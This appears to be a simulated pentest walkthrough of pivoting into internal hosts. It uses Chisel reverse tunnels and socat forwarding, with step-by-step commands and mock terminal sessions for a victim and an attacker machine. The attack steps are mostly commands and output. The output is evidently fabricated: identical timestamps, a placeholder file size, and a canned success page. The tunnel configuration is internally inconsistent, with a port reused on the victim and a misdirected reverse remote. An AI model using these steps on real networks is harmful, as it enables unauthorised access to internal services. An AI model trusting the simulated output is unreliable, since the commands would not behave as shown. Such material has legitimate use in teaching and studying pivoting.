1. Attacker Download and setup Chisel: `wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz`
2. Victim Start Chisel server on victim: `chisel server --port 8080 --reverse`
3. Attacker Create Chisel tunnel: `chisel client 192.168.1.100:8080 R:8080:internal-web.local:80` - Chisel tunnel established  
4. Attacker Create Socat tunnel: `socat TCP-LISTEN:9090,fork TCP:internal-api.local:8080` - Socat tunnel established  
5. Attacker Test tunnels: `curl http://localhost:8080`- Internal service accessed through tunnel  

```text
Victim Machine (192.168.1.100)
Welcome to Ubuntu 20.04.3 LTS
victim@target:~$ 
victim@target:~$ chisel server --port 8080 --reverse
2021/12/13 10:30:15 server: Reverse tunnelling enabled
2021/12/13 10:30:15 server: Listening on :8080
2021/12/13 10:30:15 server: Ready to accept connections
victim@target:~$ 
victim@target:~$

```  


```text
pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
Type help to see available commands.
pentester@kali-linux:~$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
--2021-12-13 10:30:15--  https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
Resolving github.com (github.com)... 140.82.113.4
Connecting to github.com (github.com)|140.82.113.4|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1234567 (1.2M) [application/octet-stream]
Saving to: 'chisel_1.7.7_linux_amd64.gz'

chisel_1.7.7_linux_amd64.gz    100%[=====================================>]   1.2M  1.2MB/s   in 1.0s

2021-12-13 10:30:15 (1.2 MB/s) - 'chisel_1.7.7_linux_amd64.gz' saved [1234567/1234567]
pentester@kali-linux:~$ chisel client 192.168.1.100:8080 R:8080:internal-web.local:80
2021/12/13 10:30:15 client: Connected to 192.168.1.100:8080
2021/12/13 10:30:15 client: Tunnel established: localhost:8080 -> internal-web.local:80
2021/12/13 10:30:15 client: Ready to accept connections
pentester@kali-linux:~$ socat TCP-LISTEN:9090,fork TCP:internal-api.local:8080
socat: listening on port 9090, forwarding to internal-api.local:8080
socat: accepting connection from any host on port 9090
pentester@kali-linux:~$ curl http://localhost:8080
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Internal Service</title></head>
<body>
<h1>Welcome to Internal Service</h1>
<p>Successfully accessed through advanced tunneling!</p>
</body>
</html>
pentester@kali-linux:~$
```  

